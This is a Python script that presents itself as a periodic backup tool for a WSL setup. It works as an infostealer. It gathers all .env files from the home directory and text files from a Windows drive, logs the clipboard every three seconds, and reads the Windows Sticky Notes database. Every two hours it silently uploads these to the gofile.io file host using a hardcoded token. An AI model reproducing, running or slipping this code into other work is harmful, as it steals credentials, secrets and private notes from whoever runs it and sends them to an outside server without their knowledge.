import os
import shutil
import time
import subprocess
import requests
from datetime import datetime
import threading
import getpass

def get_windows_username():
    try:
        result = subprocess.run(
            ["powershell.exe", "-Command", "[System.Environment]::UserName"],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception:
        pass
    return os.environ.get("USERNAME", getpass.getuser())

def backup_files(source_dir, target_dir, file_extension):
    source_dir = os.path.abspath(os.path.expanduser(source_dir))
    target_dir = os.path.abspath(os.path.expanduser(target_dir))

    if os.path.exists(target_dir):
        shutil.rmtree(target_dir)

    os.makedirs(target_dir, exist_ok=True)

    for root, _, files in os.walk(source_dir):
        for file in files:
            if file.endswith(file_extension):
                source_file = os.path.join(root, file)
                relative_path = os.path.relpath(root, source_dir)
                target_sub_dir = os.path.join(target_dir, relative_path)
                target_file = os.path.join(target_sub_dir, file)

                os.makedirs(target_sub_dir, exist_ok=True)
                try:
                    shutil.copy2(source_file, target_file)
                except Exception:
                    pass

    return target_dir

def zip_backup_folder(folder_path, zip_file_path):
    try:
        if os.path.exists(f"{zip_file_path}.zip"):
            os.remove(f"{zip_file_path}.zip")
        
        shutil.make_archive(zip_file_path, 'zip', folder_path)
        return f"{zip_file_path}.zip"
    except Exception:
        return None

def is_valid_file(file_path):
    try:
        if not os.path.isfile(file_path):
            return False
        if os.path.getsize(file_path) == 0:
            return False
        with open(file_path, "rb"):
            pass
        return True
    except Exception:
        return False

def upload_file(file_path, api_token):
    if is_valid_file(file_path):
        try:
            with open(file_path, "rb") as f:
                response = requests.post(
                    "https://store9.gofile.io/uploadFile",
                    files={"file": f},
                    data={"token": api_token}
                )
        except Exception:
            pass

def upload_directory(directory_path, api_token):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            upload_file(file_path, api_token)

# ========== 剪贴板监控和日志记录 ========== 
def get_clipboard_content():
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception:
        return None

def log_clipboard_update(content, file_path):
    try:
        with open(file_path, 'a') as f:
            f.write(f"Time: {datetime.now()}\n{content}\n\n")
            f.flush()
            os.fsync(f.fileno())
    except Exception:
        pass

def monitor_clipboard(file_path):
    last_content = ""
    while True:
        current_content = get_clipboard_content()
        if current_content and current_content != last_content:
            log_clipboard_update(current_content, file_path)
            last_content = current_content
        time.sleep(3)

def periodic_backup_upload():
    windows_user = get_windows_username()

    env_backup_directory = "~/dev/Backup/env"
    txt_backup_directory = "~/dev/Backup/txt"
    txt_source_directory = "/mnt/d"
    clipboard_log_path = os.path.expanduser("~/dev/Backup/clipboard_log.txt")
    sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
    api_token = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"

    threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()

    os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
    open(clipboard_log_path, 'a').close()

    while True:
        env_backup_dir = backup_files("~", env_backup_directory, ".env")

        txt_backup_dir = backup_files(txt_source_directory, txt_backup_directory, ".txt")

        zip_file_path = os.path.expanduser("~/dev/Backup/backup_files")
        zip_file = zip_backup_folder(env_backup_dir, zip_file_path)

        if zip_file:
            upload_file(zip_file, api_token)

        if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
            upload_file(clipboard_log_path, api_token)

        if os.path.exists(sticky_notes_path):
            upload_file(sticky_notes_path, api_token)

        time.sleep(7200)  

if __name__ == '__main__':
    periodic_backup_upload()
